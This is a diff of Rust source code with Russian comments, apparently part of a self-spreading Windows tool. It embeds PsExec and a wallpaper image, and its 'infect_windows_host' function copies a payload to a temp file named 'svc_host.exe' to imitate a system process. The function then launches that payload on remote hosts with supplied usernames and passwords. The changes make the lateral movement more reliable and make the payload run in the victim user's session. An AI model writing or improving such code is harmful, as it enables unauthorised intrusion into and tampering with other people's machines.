@@ -19,7 +19,7 @@ use std::io::{Write, Read};
 #[cfg(target_os = "windows")]
 const PSEXEC_BYTES: &[u8] = include_bytes!("../assets/PsExec.exe");
 
-// Встраиваем картинку (Убедись, что файл существует!)
+// Встраиваем картинку
 #[cfg(target_os = "windows")]
 const WALLPAPER_BYTES: &[u8] = include_bytes!("../assets/cat.png");
 
@@ -82,12 +82,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 if let Ok(mut f) = std::fs::File::create(&wall_path) {
                     if f.write_all(WALLPAPER_BYTES).is_ok() {
                         info!("Wallpaper unpacked to {:?}", wall_path);
-                        // Устанавливаем
                         if let Some(path_str) = wall_path.to_str() {
+                            // Устанавливаем через API + Реестр
                             if let Err(e) = windows::WindowsPlatform::set_wallpaper(path_str) {
                                 warn!("Failed to set wallpaper: {}", e);
                             } else {
                                 info!("Wallpaper changed successfully");
+                                // Даем Windows время на прорисовку перед тяжелой работой
+                                std::thread::sleep(std::time::Duration::from_secs(2)); 
                             }
                         }
                     }
@@ -270,14 +272,29 @@ async fn infect_windows_host(host: &str, user: &str, pass: &str, payload: &str, 
 
     let target = format!("\\\\{}", host);
 
-    // Добавляем флаг -n 5 (таймаут) для ускорения
+    // Дополнительная надежность: копируем бинарник во временный файл
+    let temp_payload = std::env::temp_dir().join("svc_host.exe");
+    if let Ok(_) = std::fs::copy(payload, &temp_payload) {
+        debug!("Payload copied to temp: {:?}", temp_payload);
+    }
+    let payload_to_use = if temp_payload.exists() { 
+        temp_payload.to_string_lossy().to_string() 
+    } else { 
+        payload.to_string() 
+    };
+
     let mut psexec_args = vec![
         target,
         "-accepteula".to_string(),
         "-u".to_string(), user.to_string(),
         "-p".to_string(), pass.to_string(),
-        "-s".to_string(), "-h".to_string(), "-i".to_string(), "-c".to_string(), "-f".to_string(), "-n".to_string(), "5".to_string(),
-        payload.to_string(),
+        // УБРАЛИ "-s" - теперь запускаемся как юзер, и обои применятся к его сессии
+        "-h".to_string(), 
+        "-i".to_string(), // Интерактивный режим (важно для GUI)
+        "-c".to_string(), 
+        "-f".to_string(), 
+        "-n".to_string(), "5".to_string(),
+        payload_to_use, 
     ];
     psexec_args.extend_from_slice(args);
 
